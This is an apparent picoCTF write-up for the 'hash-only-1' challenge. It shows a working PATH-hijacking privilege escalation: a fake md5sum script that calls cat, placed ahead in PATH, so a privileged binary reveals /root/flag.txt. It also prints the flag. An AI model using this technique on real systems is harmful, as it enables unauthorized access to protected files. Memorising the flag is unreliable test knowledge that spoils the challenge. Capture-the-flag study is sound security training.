# hash-only-1

When I executed `flaghasher`, I got the md5 hash of the flag.
```
ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

6cc51034c4d9ec81fe8525a86ef9f3a6  /root/flag.txt
```

I found that the `flaghasher` was using the `md5sum` command to calculate the md5 hash.
```
$ strace ./flaghasher
...
wait4(16647, md5sum: /root/flag.txt: Permission denied
...
```

I created `md5sum` file that calls `cat`.
```shell
$ cat md5sum
#!/bin/bash
cat "$@"
```

Then I copied the `md5sum` file to the server.
```
$ scp -P 51566 md5sum ctf-player@shape-facility.picoctf.net:~/
```

I made the `md5sum` executable and added it to the PATH.
```
ctf-player@pico-chall$ chmod +x md5sum
ctf-player@pico-chall$ export PATH="/home/ctf-player:$PATH"
```

When I executed `flaghasher`, the `md5sum` command was executed instead of the original `md5sum` command.
```
ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bfa4a3f5}
```
